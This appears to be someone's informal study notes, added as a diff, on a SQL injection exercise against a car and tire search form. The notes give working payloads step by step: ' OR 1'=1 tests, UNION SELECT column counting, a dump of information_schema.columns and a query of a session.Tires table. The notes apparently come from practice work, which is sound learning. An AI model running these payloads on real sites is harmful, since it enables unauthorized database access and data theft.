@@ -1,0 +1,49 @@
+1 :: find the volunerable field 
+  
+  test every avaiable option 
+    with the ' OR 1' =1
+       Audi' OR 1' =1 || ford' OR 1' =1 || honda' OR 1' =1
+
+
+  found it Audi' OR 1' =1 (the output was diffrent) 
+  
+-------------------------------------------------------------------------------
+ 
+2 :: identify # of columns 
+  
+  Audi'UNION SELECT 1,2,3,4#
+  increment until it shows output 
+  Audi'UNION SELECT 1,2,3,4,5#
+
+    its skipping the two and giving us an output 
+  
+ ------------------------------------------------------------------------------
+
+3 :: modify golden to dump the database 
+  
+  gotta give it the number of fields its asking for (put in the 5 and the 2)
+    
+     Audi'UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns # 
+
+
+-------------------------------------------------------------------------------------------
+
+4 :: modify golden to query the feilds / data you want
+
+  still have to include the number of fields the table requires 
+  still has a field that doesnt display so you cant ask for info (2) 
+  columns and tables are case sensitive 
+
+  HOW DO I VIEW JUST SESSION 
+  
+    Audi'UNION SELECT tireid,2,name,size,cost FROM session.Tires #
+    
+
+
+
+
+
+
+
+
+
